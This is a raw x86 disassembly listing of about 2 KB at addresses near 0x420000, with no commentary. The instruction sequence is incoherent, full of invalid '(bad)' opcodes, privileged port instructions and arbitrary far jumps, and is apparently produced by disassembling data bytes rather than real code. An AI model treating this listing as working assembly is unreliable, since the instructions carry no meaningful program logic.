  42001e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42001f:	and    ebp,DWORD PTR [edx+edi*8-0x59]
  420023:	inc    esi
  420024:	into   
  420025:	mov    bh,0x13
  420027:	mov    dh,dh
  420029:	sub    al,0x8a
  42002b:	test   ecx,esi
  42002d:	arpl   WORD PTR fs:[edi+0x7a],di
  420031:	mov    ebx,0x9cb87202
  420036:	and    al,0x5
  420038:	loop   0x420098
  42003a:	adc    DWORD PTR [esi],edx
  42003c:	mov    bh,0xc8
  42003e:	sbb    DWORD PTR [esi],eax
  420040:	adc    eax,0x1f9416c8
  420045:	push   esi
  420046:	pop    ebx
  420047:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420048:	jnp    0x420090
  42004a:	sub    DWORD PTR [ebx],edx
  42004c:	call   0x2bfd2d7f
  420051:	or     al,BYTE PTR [ebx+0x316c6a2a]
  420057:	cmp    eax,0xab27674c
  42005c:	daa    
  42005d:	cs adc al,0x82
  420060:	(bad)  
  420061:	jb     0x420057
  420063:	dec    ecx
  420064:	jnp    0x420034
  420066:	and    ch,BYTE PTR [edi]
  420068:	out    dx,al
  420069:	sub    edx,DWORD PTR [ecx+0x29]
  42006c:	test   al,0x3b
  42006e:	xchg   esi,eax
  42006f:	cs push esp
  420071:	clc    
  420072:	mov    ds:0x30c5e6ce,eax
  420077:	mov    cs,WORD PTR [edi]
  420079:	mov    ebx,0x31572eab
  42007e:	add    bh,BYTE PTR [edx-0x55]
  420081:	test   ch,ch
  420083:	pop    edx
  420084:	call   DWORD PTR [esi+0x2c28dc39]
  42008a:	out    dx,al
  42008b:	push   edi
  42008c:	bound  esi,QWORD PTR [eax]
  42008e:	mov    ch,0xa6
  420090:	sub    al,0x9e
  420092:	mov    eax,ds:0x72655e3
  420097:	adc    ah,BYTE PTR [ebx]
  420099:	pop    eax
  42009a:	loope  0x4200f9
  42009c:	imul   eax,DWORD PTR [ebp+0x172eca4f],0x2b84b639
  4200a6:	fs (bad) 
  4200a8:	retf   
  4200a9:	(bad)  
  4200ab:	fdiv   st,st(1)
  4200ad:	stos   BYTE PTR es:[edi],al
  4200ae:	push   ss
  4200af:	xchg   edi,eax
  4200b0:	inc    esi
  4200b1:	mov    WORD PTR [edi+0x10cd5c22],?
  4200b7:	xor    DWORD PTR [esi+eiz*8-0x4],ebx
  4200bb:	mov    BYTE PTR [ebx-0x101aceba],cl
  4200c1:	sbb    DWORD PTR [eax+0x3ffc18d6],edx
  4200c7:	and    al,0xd3
  4200c9:	jo     0x4200cc
  4200cb:	cmc    
  4200cc:	sbb    esi,edi
  4200ce:	stos   DWORD PTR es:[edi],eax
  4200cf:	or     DWORD PTR [ecx+ebp*4+0x5e65128],esp
  4200d6:	pop    edi
  4200d7:	xchg   BYTE PTR [edi+0x6],ch
  4200da:	int    0x2d
  4200dc:	push   edi
  4200dd:	cwde   
  4200de:	jno    0x42013c
  4200e0:	pop    ebx
  4200e1:	in     al,0x58
  4200e3:	icebp  
  4200e4:	adc    ebx,ebp
  4200e6:	sbb    al,0xc9
  4200e8:	mov    BYTE PTR [edi],ah
  4200ea:	mov    DWORD PTR [ebx+0x4a],edi
  4200ed:	jg     0x4200a0
  4200ef:	div    BYTE PTR [ecx-0x423f10d1]
  4200f5:	test   bh,al
  4200f7:	dec    esp
  4200f8:	sbb    eax,0xc44028f0
  4200fd:	jae    0x42012c
  4200ff:	stc    
  420100:	inc    esp
  420101:	jae    0x42016d
  420103:	mov    DWORD PTR [esi],ecx
  420105:	xor    edx,DWORD PTR [ebx+0x12ce250e]
  42010b:	test   cl,dl
  42010d:	or     al,0xc5
  42010f:	or     eax,0xfaed14b1
  420114:	es push ss
  420116:	clc    
  420117:	popf   
  420118:	add    ch,BYTE PTR [esp+ebx*8-0x6b]
  42011c:	(bad)  
  42011d:	mov    ebx,0x124593bf
  420122:	dec    esp
  420123:	lock jecxz 0x42017e
  420126:	xchg   ebx,eax
  420127:	pop    ecx
  420128:	clc    
  420129:	jecxz  0x42016e
  42012b:	leave  
  42012c:	xlat   BYTE PTR ds:[ebx]
  42012d:	add    bl,BYTE PTR [eax]
  42012f:	aam    0xc9
  420131:	mov    ch,0xf4
  420133:	jmp    0x6e6cfea5
  420138:	or     al,0x9b
  42013a:	aaa    
  42013b:	stos   DWORD PTR es:[edi],eax
  42013c:	sbb    dh,BYTE PTR [edi-0x261e2d89]
  420142:	add    ebp,esi
  420144:	adc    DWORD PTR [eax-0x17],0x46
  420148:	ficom  DWORD PTR [eax+esi*8+0x77]
  42014c:	scas   eax,DWORD PTR es:[edi]
  42014d:	rcr    DWORD PTR [edi-0x4f],0x63
  420151:	out    dx,eax
  420152:	ret    0x8b7c
  420155:	cmp    cl,BYTE PTR [esi+0x34]
  420158:	and    cl,BYTE PTR [ebx]
  42015a:	out    0x79,eax
  42015c:	pop    ecx
  42015d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42015e:	inc    esi
  42015f:	scas   eax,DWORD PTR es:[edi]
  420160:	cli    
  420161:	dec    ebx
  420162:	adc    eax,0xfe148f23
  420167:	into   
  420168:	pop    ebx
  420169:	xchg   edx,eax
  42016a:	test   ebp,esp
  42016c:	imul   eax,DWORD PTR [ebx-0x38],0xffffffbe
  420170:	icebp  
  420171:	mov    esi,0x61637172
  420176:	lea    edi,[esi+0x681c662a]
  42017c:	(bad)  
  42017d:	ror    BYTE PTR [edi-0x76],0xec
  420181:	sbb    BYTE PTR [ebp+0x5769],0x0
	...
  420190:	add    BYTE PTR [edx+ecx*1-0x6060f363],dl
  420197:	xchg   ebp,eax
  420198:	call   0x53c5:0x7836e732
  42019f:	imul   esp,DWORD PTR [edi],0xffffffdd
  4201a2:	jnp    0x4201a5
  4201a4:	add    BYTE PTR [ebx+eax*1+0x20580000],ch
  4201ab:	pop    eax
  4201ac:	ja     0x4201a7
  4201ae:	xchg   esi,eax
  4201af:	and    bl,BYTE PTR [esp+ecx*1]
  4201b2:	jae    0x420232
  4201b4:	test   eax,0x4f94173e
  4201b9:	sub    eax,0x36549774
  4201be:	sub    ch,ah
  4201c0:	lea    esp,[edx-0x7a1e9a90]
  4201c6:	cmovbe cx,dx
  4201ca:	mov    bl,0xdf
  4201cc:	fidiv  DWORD PTR ds:0xb258567c
  4201d2:	imul   eax,DWORD PTR [ebx-0x4b],0x56792562
  4201d9:	iret   
  4201da:	xchg   ecx,eax
  4201db:	stc    
  4201dc:	and    BYTE PTR [ebx-0x2f0a2cd3],bl
  4201e2:	xchg   edi,eax
  4201e3:	add    bl,BYTE PTR [ebp-0x7aad7544]
  4201e9:	in     al,0xda
  4201eb:	mov    dl,0xd7
  4201ed:	shl    DWORD PTR ds:0x493e6422,1
  4201f3:	test   DWORD PTR [ebp+0x1e0f54a9],ecx
  4201f9:	cmp    DWORD PTR [edi],ebp
  4201fb:	mov    bl,0xad
  4201fd:	icebp  
  4201fe:	test   eax,0x60fdcfba
  420203:	cmp    DWORD PTR [ebx-0x1f176363],0xe76da642
  42020d:	lea    ecx,[edi]
  42020f:	fsub   DWORD PTR [eax]
  420211:	dec    esp
  420212:	dec    esi
  420213:	ret    0xee4e
  420216:	stos   DWORD PTR es:[edi],eax
  420217:	cs (bad) 
  420219:	neg    BYTE PTR [edi]
  42021b:	mov    ds:0xf5fef0aa,al
  420220:	pop    esi
  420221:	ins    BYTE PTR es:[edi],dx
  420222:	pop    edx
  420223:	rcr    DWORD PTR [esi+0x53],0xc3
  420227:	loopne 0x4201e1
  420229:	mov    esp,0xd3662c35
  42022e:	xor    BYTE PTR [ebp+0x5a],ch
  420231:	mov    dh,0x33
  420233:	lahf   
  420234:	pusha  
  420235:	xchg   bl,dh
  420237:	loop   0x4201ea
  420239:	push   ebx
  42023a:	int3   
  42023b:	mov    BYTE PTR [ebx],0x1e
  42023e:	cmp    al,0xad
  420240:	xchg   esi,eax
  420241:	pop    esp
  420242:	mov    al,ds:0x9ce13ed4
  420247:	jne    0x4201f4
  420249:	push   ecx
  42024a:	inc    esi
  42024b:	jg     0x4201fb
  42024d:	jmp    0x420291
  42024f:	sbb    ch,BYTE PTR [edx-0x6e]
  420252:	ss int 0x89
  420255:	fwait
  420256:	dec    edi
  420257:	retf   
  420258:	push   ss
  420259:	pop    eax
  42025a:	in     eax,dx
  42025b:	jl     0x420233
  42025d:	das    
  42025e:	mov    ch,0x61
  420260:	hlt    
  420261:	imul   edx,edi,0xffffffec
  420264:	dec    ebx
  420265:	cli    
  420266:	(bad)  
  420267:	in     al,dx
  420268:	mov    ebx,0x2efd1ea8
  42026d:	cmp    edi,edx
  42026f:	pop    es
  420270:	inc    ecx
  420271:	inc    edi
  420272:	pop    edx
  420273:	dec    eax
  420274:	in     eax,0xfa
  420276:	push   cs
  420277:	and    dh,BYTE PTR [edx]
  420279:	ds dec ecx
  42027b:	cli    
  42027c:	ror    DWORD PTR [eax-0x6c],0xcc
  420280:	sbb    cl,BYTE PTR [edi]
  420282:	jg     0x4202bc
  420284:	adc    ebp,0x17
  420287:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420288:	mov    ah,dh
  42028a:	(bad)  
  42028c:	mov    esi,0xb5e1206e
  420291:	cmp    edx,ecx
  420293:	int    0x5b
  420295:	jnp    0x420259
  420297:	push   es
  420298:	cmp    ecx,esi
  42029a:	es and al,dh
  42029d:	cmp    BYTE PTR [ebp+eax*8+0x4165b4d4],bl
  4202a4:	sub    al,0xa7
  4202a6:	mov    ds:0x7a1538e0,al
  4202ab:	icebp  
  4202ac:	pop    ecx
  4202ad:	add    eax,0x9b3a4e7e
  4202b2:	ins    BYTE PTR es:[edi],dx
  4202b3:	sbb    BYTE PTR [edx*2-0x53807dce],0xac
  4202bb:	push   ss
  4202bc:	xchg   ecx,eax
  4202bd:	pop    edi
  4202be:	pop    ebx
  4202bf:	push   0xab1acbb6
  4202c4:	pop    ecx
  4202c5:	mov    dh,dl
  4202c7:	push   ecx
  4202c8:	fs or  eax,0xa25c677
  4202ce:	std    
  4202cf:	or     al,0x86
  4202d1:	(bad)  
  4202d2:	repz fmul st(7),st
  4202d5:	mov    ch,0xc6
  4202d7:	cmp    al,0xfc
  4202d9:	nop
  4202da:	xor    al,0xf4
  4202dc:	pop    esi
  4202dd:	jo     0x4202d0
  4202df:	adc    eax,0xc26501d8
  4202e4:	mov    ebp,0xeabf774d
  4202e9:	mov    ebx,0x619a9549
  4202ee:	in     al,dx
  4202ef:	add    al,0x9f
  4202f1:	in     al,0xa5
  4202f3:	sub    ch,0xd3
  4202f6:	cmp    eax,0x110cdeb0
  4202fb:	data16 ins BYTE PTR es:[edi],dx
  4202fd:	sbb    ecx,esp
  4202ff:	cmp    BYTE PTR [edx-0xde22ca6],dh
  420305:	pop    ebp
  420306:	fadd   QWORD PTR [edi+0xc]
  420309:	and    BYTE PTR [esp+ebx*1],cl
  42030c:	sub    DWORD PTR [edi],0xffffffb0
  42030f:	pop    edx
  420310:	dec    edx
  420311:	pop    esi
  420312:	pop    edx
  420313:	mov    WORD PTR [ebp+0x3],?
  420316:	or     BYTE PTR [ebx+0x4b],ah
  420319:	lods   eax,DWORD PTR ds:[esi]
  42031a:	jecxz  0x4202cc
  42031c:	iret   
  42031d:	mov    ss,esi
  42031f:	adc    eax,0xc86b542e
  420324:	mov    ah,0xb4
  420326:	(bad)  
  420327:	xchg   esi,eax
  420328:	push   ebx
  420329:	cmp    BYTE PTR [ebx],bh
  42032b:	jbe    0x420334
  42032d:	sub    ebx,DWORD PTR [esi+0x3b38bb0b]
  420333:	js     0x42035c
  420335:	jne    0x42039e
  420337:	sahf   
  420338:	icebp  
  420339:	lods   al,BYTE PTR ds:[esi]
  42033a:	aaa    
  42033b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42033c:	sbb    BYTE PTR [eax+0x10e343f3],bl
  420342:	mov    ch,0xf5
  420344:	outs   dx,BYTE PTR ds:[esi]
  420345:	std    
  420346:	lds    esi,FWORD PTR es:[ecx]
  420349:	imul   esi,DWORD PTR [edx],0xffffffc3
  42034c:	mov    ebx,0xa33cab52
  420351:	sti    
  420352:	mov    bh,0x3f
  420354:	rol    BYTE PTR [ebx-0x610ecaf],1
  42035a:	mov    edi,0xe32ae345
  42035f:	inc    ebx
  420360:	fs cmp esp,0x20
  420364:	scas   eax,DWORD PTR es:[edi]
  420365:	sahf   
  420366:	arpl   WORD PTR [eax-0x32f1f6cf],sp
  42036c:	xor    ch,ch
  42036e:	mov    ds:0x1b2f4521,eax
  420373:	xchg   esi,eax
  420374:	(bad)  
  420375:	addr16 mov eax,ds:0x82ed
  420379:	add    BYTE PTR [ecx],cl
  42037b:	loope  0x420379
  42037d:	xchg   esp,eax
  42037e:	mov    ecx,0xf41ac7e8
  420383:	xchg   edi,edi
  420385:	stos   DWORD PTR es:[edi],eax
  420386:	sub    DWORD PTR [ecx+0x71],eax
  420389:	loopne 0x420371
  42038b:	push   ebp
  42038c:	enter  0x3146,0x64
  420390:	setns  BYTE PTR [edi-0x49ddbfc7]
  420397:	xor    bh,BYTE PTR [edi-0x79]
  42039a:	addr16 inc ebp
  42039c:	popa   
  42039d:	mov    ch,0xca
  42039f:	push   edi
  4203a0:	mov    edx,0x4ed99f9c
  4203a5:	pop    ss
  4203a6:	out    0xdb,eax
  4203a8:	or     eax,0x54a6470f
  4203ad:	or     DWORD PTR [edx-0x2c],eax
  4203b0:	pusha  
  4203b1:	aaa    
  4203b2:	data16 cld 
  4203b4:	push   ecx
  4203b5:	jae    0x42038e
  4203b7:	sahf   
  4203b8:	imul   ecx,DWORD PTR [ecx+0x6171ac2f],0x11
  4203bf:	nop
  4203c0:	test   ecx,ecx
  4203c2:	stos   DWORD PTR es:[edi],eax
  4203c3:	mov    ebp,ecx
  4203c5:	std    
  4203c6:	cwde   
  4203c7:	mov    edi,0x2a90ba2b
  4203cc:	ret    0x4f8c
  4203cf:	mov    dh,0xb7
  4203d1:	xchg   bl,dh
  4203d3:	loope  0x4203fd
  4203d5:	jns    0x4203a8
  4203d7:	add    bh,dh
  4203d9:	xchg   esp,eax
  4203da:	mov    WORD PTR [ecx-0x79],cs
  4203dd:	xchg   DWORD PTR [esi],eax
  4203df:	lods   eax,DWORD PTR ds:[esi]
  4203e0:	xchg   ebp,eax
  4203e1:	adc    al,0x12
  4203e3:	jp     0x4203ca
  4203e5:	cwde   
  4203e6:	jbe    0x4203fa
  4203e8:	fnstcw WORD PTR [edi-0x48]
  4203eb:	push   ebx
  4203ec:	call   0x9205fb31
  4203f1:	mov    DWORD PTR [edx-0x7e2b3af8],esp
  4203f7:	fdivr  st(4),st
  4203f9:	call   0xc851d742
  4203fe:	sub    ebp,DWORD PTR [ebp+0x42f715e7]
  420404:	mov    BYTE PTR ds:0xf75bce47,dh
  42040a:	fld    TBYTE PTR [ecx]
  42040c:	sbb    DWORD PTR [edx+0x655efdb0],ebp
  420412:	sub    eax,0x9f91dcd5
  420417:	(bad)  
  420418:	sbb    eax,0xe5ef0814
  42041d:	sti    
  42041e:	cs mov dl,0xf7
  420421:	fidivr DWORD PTR [esi-0x10]
  420424:	repz addr16 push 0xffffff83
  420428:	jns    0x420486
  42042a:	mov    bh,0xb9
  42042c:	addr16 inc esi
  42042e:	in     eax,dx
  42042f:	push   cs
  420430:	and    eax,0xeac10904
  420435:	inc    esi
  420436:	jb     0x42044c
  420438:	and    eax,0xf1564972
  42043d:	fisttp DWORD PTR [edi-0x77e50fcc]
  420443:	ret    0xc4a2
  420446:	push   esp
  420447:	and    eax,0x7ecbeae7
  42044c:	and    esp,DWORD PTR [edx-0x52]
  42044f:	mov    eax,ds:0x18cc2de1
  420454:	sbb    al,0xe7
  420456:	mov    al,0x54
  420458:	stc    
  420459:	rcl    BYTE PTR [ecx],1
  42045b:	inc    eax
  42045c:	aas    
  42045d:	push   edi
  42045e:	cdq    
  42045f:	imul   esp,DWORD PTR [ebx-0x13],0x2ea7bbd8
  420466:	dec    ecx
  420467:	adc    al,0xcd
  420469:	cmp    DWORD PTR [eax-0x561786b8],0x7a
  420470:	xchg   DWORD PTR [ebp-0x333db9f7],esi
  420476:	outs   dx,DWORD PTR ds:[esi]
  420477:	jl     0x42044c
  420479:	jge    0x4204c2
  42047b:	xchg   edx,eax
  42047c:	scas   eax,DWORD PTR es:[edi]
  42047d:	std    
  42047e:	pop    eax
  42047f:	je     0x42046b
  420481:	mov    bh,BYTE PTR es:[edx]
  420484:	adc    ah,BYTE PTR [ebx+0x7c]
  420487:	jne    0x420433
  420489:	cmp    eax,0xc2753270
  42048e:	or     eax,0x487470b2
  420493:	push   cs
  420494:	retf   0x166d
  420497:	rcl    bl,0xf0
  42049a:	scas   eax,DWORD PTR es:[edi]
  42049b:	dec    BYTE PTR [esi+0x19]
  42049e:	mov    ecx,0xe30069
  4204a3:	sbb    eax,0x1751da5d
  4204a8:	loop   0x420468
  4204aa:	mov    ah,0x36
  4204ac:	data16 and bh,BYTE PTR [esi-0x4e]
  4204b0:	les    edi,FWORD PTR [esi-0x51]
  4204b3:	xchg   edi,eax
  4204b4:	neg    DWORD PTR [esi+0x2d0c3a0]
  4204ba:	mov    edi,0x53761102
  4204bf:	out    0x4e,eax
  4204c1:	ror    BYTE PTR [edx],1
  4204c3:	scas   eax,DWORD PTR es:[edi]
  4204c4:	lock mov eax,fs:0x485306ba
  4204cb:	adc    BYTE PTR [eax+0x6776892f],al
  4204d1:	imul   esp,edi,0x130a8c0e
  4204d7:	sahf   
  4204d8:	stos   DWORD PTR es:[edi],eax
  4204d9:	xor    al,0x15
  4204db:	push   cs
  4204dc:	pop    esp
  4204dd:	jle    0x42054f
  4204df:	add    BYTE PTR [edi],dl
  4204e1:	scas   eax,DWORD PTR es:[edi]
  4204e2:	arpl   WORD PTR [ecx-0x1d45eaa8],dx
  4204e8:	(bad)  [eax]
  4204ea:	lahf   
  4204eb:	mov    al,ds:0x4c68df2
  4204f0:	scas   eax,DWORD PTR es:[edi]
  4204f1:	outs   dx,BYTE PTR ds:[esi]
  4204f2:	test   al,0xae
  4204f4:	adc    dh,ah
  4204f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204f7:	cmp    eax,0x49e2f966
  4204fc:	in     al,dx
  4204fd:	(bad)  
  4204fe:	popa   
  4204ff:	retf   
  420500:	das    
  420501:	mov    eax,ds:0xf7f5538a
  420506:	jmp    0x40c7:0x454aa7e
  42050d:	aad    0x78
  42050f:	push   edi
  420510:	sub    al,0xe6
  420512:	dec    eax
  420513:	push   0x5c735bdc
  420518:	bound  esp,QWORD PTR [ebx+0x76]
  42051b:	push   0xffffffe3
  42051d:	xchg   esi,eax
  42051e:	outs   dx,DWORD PTR ds:[esi]
  42051f:	and    al,0x3a
  420521:	pop    ecx
  420522:	(bad)  
  420523:	fsubr  st,st(5)
  420525:	nop    DWORD PTR [ecx]
  420528:	pop    esp
  420529:	pop    edi
  42052a:	xchg   DWORD PTR [edi],esp
  42052c:	xor    eax,DWORD PTR [edi-0x47]
  42052f:	mov    ecx,0x38fc684
  420534:	inc    ebp
  420535:	dec    ebx
  420536:	inc    edx
  420537:	test   cl,al
  420539:	mov    ah,0x8e
  42053b:	iret   
  42053c:	int    0x6a
  42053e:	jno    0x420584
  420540:	(bad)  
  420541:	mov    dh,0xb0
  420543:	push   edx
  420544:	sub    DWORD PTR [esi],0x4240b8fc
  42054a:	mov    esi,ds
  42054c:	push   ds
  42054d:	test   al,0x16
  42054f:	lods   eax,DWORD PTR ds:[esi]
  420550:	fsub   QWORD PTR [ecx]
  420552:	xlat   BYTE PTR ds:[ebx]
  420553:	lahf   
  420554:	int    0x0
	...
  42055e:	add    BYTE PTR [eax],al
  420560:	add    BYTE PTR [eax-0x5020734d],dl
  420566:	call   ebx
  420568:	jmp    esp
  42056a:	and    dh,0xd4
  42056d:	ficom  WORD PTR ds:0x7f894367
  420573:	add    DWORD PTR [eax],eax
  420575:	lods   al,BYTE PTR ds:[esi]
  420576:	add    eax,DWORD PTR [eax]
  420578:	add    al,ah
  42057a:	mov    ds:0x1d62f4b6,al
  42057f:	mov    ecx,0x7017df06
  420584:	xchg   ecx,eax
  420585:	push   es
  420586:	nop
  420587:	mov    ebp,0x684ec04c
  42058c:	repnz mov BYTE PTR [ebp-0x36],cl
  420590:	sub    eax,0xdf2275ff
  420595:	daa    
  420596:	je     0x420615
  420598:	test   BYTE PTR [ebx],dl
  42059a:	pop    ds
  42059b:	lds    edx,FWORD PTR [edx+0x1519eb00]
  4205a1:	retf   
  4205a2:	cmp    dh,BYTE PTR [ecx]
  4205a4:	mov    ebx,0xdba2d122
  4205a9:	jnp    0x42060e
  4205ab:	dec    edx
  4205ac:	aad    0x46
  4205ae:	mov    dl,0xa5
  4205b0:	mov    dh,0xb6
  4205b2:	pusha  
  4205b3:	and    DWORD PTR [edi],ebp
  4205b5:	sar    esp,0xcf
  4205b8:	ds lock ret 0xd947
  4205bd:	jg     0x420639
  4205bf:	adc    DWORD PTR [edi],edi
  4205c1:	push   edi
  4205c2:	xor    eax,0x2abbe85e
  4205c7:	sbb    eax,0x253fcee5
  4205cc:	dec    ebx
  4205cd:	push   edx
  4205ce:	jmp    0x420606
  4205d0:	mov    edx,0xaeec4728
  4205d5:	jne    0x420631
  4205d7:	cmp    eax,0x94ee082d
  4205dc:	in     eax,dx
  4205dd:	mov    ah,0x23
  4205df:	sbb    BYTE PTR [ebx],bl
  4205e1:	stos   DWORD PTR es:[edi],eax
  4205e2:	in     eax,dx
  4205e3:	pop    ebp
  4205e4:	xor    al,BYTE PTR [esi]
  4205e6:	call   0x6ae8e103
  4205eb:	test   dh,al
  4205ed:	pop    es
  4205ee:	or     BYTE PTR [ebx+0x51741a9a],bh
  4205f4:	xchg   esp,eax
  4205f5:	xchg   DWORD PTR [esi-0x2],esp
  4205f8:	push   0x6e347e0b
  4205fd:	aad    0xfd
  4205ff:	add    al,dl
  420601:	add    al,0x4b
  420603:	(bad)  
  420604:	xchg   edi,eax
  420605:	push   cs
  420606:	mov    al,0x1f
  420608:	sbb    al,0xbd
  42060a:	xor    ebx,DWORD PTR [ebx]
  42060c:	push   ds
  42060d:	xchg   esi,eax
  42060e:	pop    edx
  42060f:	push   edx
  420610:	loop   0x4205e2
  420612:	and    DWORD PTR [esi-0x43],ecx
  420615:	outs   dx,DWORD PTR ds:[esi]
  420616:	arpl   WORD PTR [edx+0x40172c7a],di
  42061c:	sub    al,0xd2
  42061e:	dec    eax
  42061f:	in     eax,0x56
  420621:	cli    
  420622:	xor    esp,edi
  420624:	fisttp QWORD PTR [edx]
  420626:	cdq    
  420627:	inc    edi
  420628:	cmp    al,0x15
  42062a:	inc    edi
  42062b:	dec    ebp
  42062c:	push   esi
  42062d:	ret    0x3d2
  420630:	or     eax,0xad442a4c
  420635:	inc    ebx
  420636:	stos   DWORD PTR es:[edi],eax
  420637:	add    eax,0x11c76b1f
  42063c:	or     BYTE PTR [edx-0x33c1ffdd],al
  420642:	je     0x4205f4
  420644:	(bad)  
  420645:	std    
  420646:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420647:	sbb    DWORD PTR [edi+edx*4+0x3c],edx
  42064b:	xchg   edx,eax
  42064c:	mov    al,0x59
  42064e:	and    al,0xec
  420650:	pusha  
  420651:	jae    0x420628
  420653:	adc    al,BYTE PTR [edx]
  420655:	mov    edi,0xb0d32c1c
  42065a:	pop    ds
  42065b:	mov    DWORD PTR [edx+0x6edbad3a],0x6a6a47f3
  420665:	push   ss
  420666:	mov    eax,0xd92fbe2a
  42066b:	test   al,0xb3
  42066d:	dec    esp
  42066e:	inc    edx
  42066f:	mov    al,ds:0x77d4b874
  420674:	inc    ebp
  420675:	das    
  420676:	data16 xor BYTE PTR [ebp-0xa],0xcf
  42067b:	mov    edx,0x4eb1d023
  420680:	pop    esi
  420681:	pop    ecx
  420682:	(bad)  [ebp+0x160b0e5f]
  420688:	hlt    
  420689:	(bad)  
  42068b:	dec    esp
  42068c:	daa    
  42068d:	scas   al,BYTE PTR es:[edi]
  42068e:	adc    DWORD PTR [ebx+esi*4-0x71],ecx
  420692:	gs data16 jb 0x4206e8
  420696:	mov    dl,0x81
  420698:	adc    BYTE PTR [edx-0x1ba11075],dh
  42069e:	cwde   
  42069f:	xchg   DWORD PTR ds:0xb01393c5,esp
  4206a5:	push   es
  4206a6:	mov    eax,0x42b19851
  4206ab:	ror    DWORD PTR [edi],0xea
  4206ae:	daa    
  4206af:	xchg   esi,eax
  4206b0:	out    dx,al
  4206b1:	ins    DWORD PTR es:[edi],dx
  4206b2:	adc    esi,DWORD PTR [ebx+eiz*2]
  4206b5:	dec    eax
  4206b6:	sbb    eax,0xa31ddb9
  4206bb:	ret    
  4206bc:	pop    eax
  4206bd:	hlt    
  4206be:	icebp  
  4206bf:	out    0xcc,al
  4206c1:	fwait
  4206c2:	mov    edx,ecx
  4206c4:	imul   edi,DWORD PTR [ebp+ecx*1+0x710fe3c8],0xffffffc6
  4206cc:	and    BYTE PTR [edx],bl
  4206ce:	mov    WORD PTR [ecx],?
  4206d0:	push   es
  4206d1:	fdivr  QWORD PTR [edi+0xc]
  4206d4:	aaa    
  4206d5:	shl    BYTE PTR ds:0xa11fb996,0x34
  4206dc:	jg     0x42074d
  4206de:	ret    
  4206df:	sub    al,0x84
  4206e1:	test   DWORD PTR [ecx-0x6],0x23acf868
  4206e8:	push   esi
  4206e9:	adc    eax,0xf2a61380
  4206ee:	pop    es
  4206ef:	mov    dl,0xec
  4206f1:	imul   DWORD PTR [esi+0x27135a3d]
  4206f7:	cli    
  4206f8:	mov    esi,0x74aeba71
  4206fd:	outs   dx,BYTE PTR ds:[esi]
  4206fe:	sar    bh,1
  420700:	out    dx,eax
  420701:	cmp    al,0x65
  420703:	xchg   edi,eax
  420704:	daa    
  420705:	mov    BYTE PTR [ebp+0x37],al
  420708:	or     BYTE PTR [edx],0x6c
  42070b:	cwde   
  42070c:	jle    0x42076b
  42070e:	mov    bh,0x39
  420710:	xor    DWORD PTR [edx-0x32d1027],eax
  420716:	gs cmp al,0x27
  420719:	lahf   
  42071a:	icebp  
  42071b:	test   DWORD PTR [esi],esp
  42071d:	mov    dl,0x56
  42071f:	jnp    0x420747
  420721:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420722:	jecxz  0x4206dd
  420724:	push   ecx
  420725:	jo     0x420717
  420727:	fwait
  420728:	js     0x420738
  42072a:	dec    ecx
  42072b:	in     al,dx
  42072c:	lods   eax,DWORD PTR ds:[esi]
  42072d:	outs   dx,DWORD PTR ds:[esi]
  42072e:	mov    BYTE PTR [esi+0x1a],bh
  420731:	lea    ecx,[ebx-0x54]
  420734:	dec    ebp
  420735:	or     DWORD PTR [ebp+0x69],ebp
  420738:	and    DWORD PTR [eax-0x5a],edi
  42073b:	or     DWORD PTR [esp+ebp*8],esp
  42073e:	inc    ebp
  42073f:	add    esi,DWORD PTR [ebx-0x24]
  420742:	stos   DWORD PTR es:[edi],eax
  420743:	mov    dl,0xf
  420745:	adc    BYTE PTR ds:0xf6f5f9ee,bl
  42074b:	and    ebp,DWORD PTR [eax+0x16fadbc6]
  420751:	jae    0x4206ed
  420753:	xchg   edx,eax
  420754:	cmp    ch,BYTE PTR [ebx-0x72d11daf]
  42075a:	retf   
  42075b:	mov    al,ds:0xddf3b719
  420760:	jmp    0x44dbb6e6
  420765:	or     al,0xcf
  420767:	push   cs
  420768:	inc    ebp
  420769:	dec    esi
  42076a:	clc    
  42076b:	xor    BYTE PTR [ecx+eax*1+0x4ed8da9e],0xa5
  420773:	jb     0x42071a
  420775:	icebp  
  420776:	xchg   ebx,eax
  420777:	stos   BYTE PTR es:[edi],al
  420778:	dec    ebx
  420779:	pop    edi
  42077a:	push   edx
  42077b:	inc    esi
  42077c:	mov    ah,dh
  42077e:	loop   0x420754
  420780:	sahf   
  420781:	mov    ecx,0xc8ed8e01
  420786:	add    DWORD PTR [edi],edx
  420788:	test   BYTE PTR [eax+0x4c],ah
  42078b:	dec    esp
  42078c:	push   edi
  42078d:	adc    cl,bh
  42078f:	iret   
  420790:	loopne 0x42077b
  420792:	adc    ebx,DWORD PTR [ecx*1+0x3c791eb0]
  420799:	scas   eax,DWORD PTR es:[edi]
  42079a:	in     al,0xe5
  42079c:	lahf   
  42079d:	ss add ecx,ebp
  4207a0:	popa   
  4207a1:	lea    esp,[edx]
  4207a3:	test   DWORD PTR [edi+0x2a426dac],eax
  4207a9:	xor    al,0xc5
  4207ab:	mov    edx,0xff75492d
  4207b0:	jns    0x4207d8
  4207b2:	inc    esp
  4207b3:	fld    QWORD PTR [eax+0x11]
  4207b6:	cmp    BYTE PTR [eax-0x6dfaba26],al
  4207bc:	mov    ch,BYTE PTR [ecx]
  4207be:	int    0x6a
  4207c0:	jo     0x4207a7
  4207c2:	inc    edx
  4207c3:	inc    esp
  4207c5:	mov    edx,0x3e41d86e
  4207ca:	xor    bh,BYTE PTR [edx-0x7b]
  4207cd:	sub    al,0x46
  4207cf:	stc    
  4207d0:	and    esi,DWORD PTR [edi+ecx*8]
  4207d3:	jbe    0x420764
  4207d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207d6:	retf   0x3d3a
  4207d9:	lock ds cwde 
  4207dc:	mov    esi,0xa4bb0ad5
  4207e1:	scas   al,BYTE PTR es:[edi]
  4207e2:	cwde   
  4207e3:	in     eax,0xa9
  4207e5:	cmp    ah,BYTE PTR ds:0xa4053955
  4207eb:	cmp    edx,eax
  4207ed:	xchg   ebx,eax
  4207ee:	fwait
  4207ef:	stc    
  4207f0:	sub    eax,0xed73bc7b
  4207f5:	and    BYTE PTR [edi+esi*8+0x1c],bh
